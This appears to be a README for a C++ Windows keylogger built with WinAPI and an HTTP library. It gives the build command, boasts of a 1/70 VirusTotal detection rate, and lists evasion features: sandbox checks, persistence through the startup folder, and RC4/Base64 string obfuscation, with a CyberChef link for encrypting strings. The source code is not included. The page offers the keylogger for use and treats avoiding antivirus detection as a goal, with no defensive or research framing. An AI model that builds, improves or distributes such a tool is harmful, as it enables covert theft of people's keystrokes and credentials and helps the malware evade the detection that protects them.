# cpp-logger
## simple c++ winapi+cpp-httplib keylogger

### Used libs:
[cpp-httplib](https://github.com/yhirose/cpp-httplib), [LICENSE](https://github.com/yhirose/cpp-httplib/blob/master/LICENSE)

## Compiler:
```
Using built-in specs.
COLLECT_GCC=i686-w64-mingw32-g++-posix
COLLECT_LTO_WRAPPER=/usr/lib/gcc/i686-w64-mingw32/10-posix/lto-wrapper
Target: i686-w64-mingw32
Configured with: (...)
Thread model: posix
Supported LTO compression algorithms: zlib
gcc version 10-posix 20220324 (GCC) 
```

## Building:
```bash
i686-w64-mingw32-g++-posix -O3 -o log -static -Wl,--build-id main.cpp -lws2_32 && strip -p log.exe
```

## Detects:
Not too bad, as usual.

### VirusTotal
#### 1/70 - [Result](https://www.virustotal.com/gui/file/b1bbef06045cfb45016179e47f0a271932395532782490b38ed83a35efc0bde7/detection)
Alot of stuff was detected: sandbox checks, startupfolder interraction, Base64 and RC4.

## Additional:
string encryption online -> [CyberChef](https://gchq.github.io/CyberChef/#recipe=RC4(%7B'option':'UTF8','string':'key'%7D,'Latin1','Base64')&input=c3RyaW5ncw)
